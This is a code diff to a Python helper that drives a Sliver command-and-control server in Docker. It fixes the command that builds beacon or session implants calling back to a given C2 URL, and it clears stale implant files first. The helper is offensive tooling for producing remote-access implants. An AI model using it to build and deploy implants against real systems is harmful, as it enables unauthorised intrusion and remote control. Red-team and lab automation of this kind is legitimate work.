@@ -290,8 +290,20 @@ def generate(kind: str, c2_url: str, target_os: str = "windows",
         raise BackendError(f"kind must be beacon|session, got {kind!r}")
     save = f"/tmp/portal-{kind}-{arch}.exe" if target_os == "windows" \
         else f"/tmp/portal-{kind}-{arch}"
+    # v1.7.7 CLI: `generate [flags]` builds a SESSION implant; `generate
+    # beacon [flags]` builds a BEACON. "session" is NOT a word — passing it
+    # compiles fine but silently skips the save step ("Implant saved to"
+    # never appears), which is why the session path omits the token.
+    word = "beacon " if kind == "beacon" else ""
+    # The sliver client's save step SILENTLY skips writing when the target
+    # already exists (build banner still says "Build completed"), so clear
+    # any stale file first — e.g. from a previous run's 0700 root-owned
+    # artifact. Without this the "Implant saved to" marker never appears
+    # and the operator would carry on with a stale implant.
+    subprocess.run([_docker(), "exec", SLIVER_CONTAINER, "rm", "-f", save],
+                   capture_output=True, timeout=30, check=False)
     out = run_rc(
-        [f"generate {kind} --http {c2_url} --os {target_os} "
+        [f"generate {word}--http {c2_url} --os {target_os} "
          f"--arch {arch} --save {save}"],
         timeout=timeout)
     if "Implant saved to" not in out:
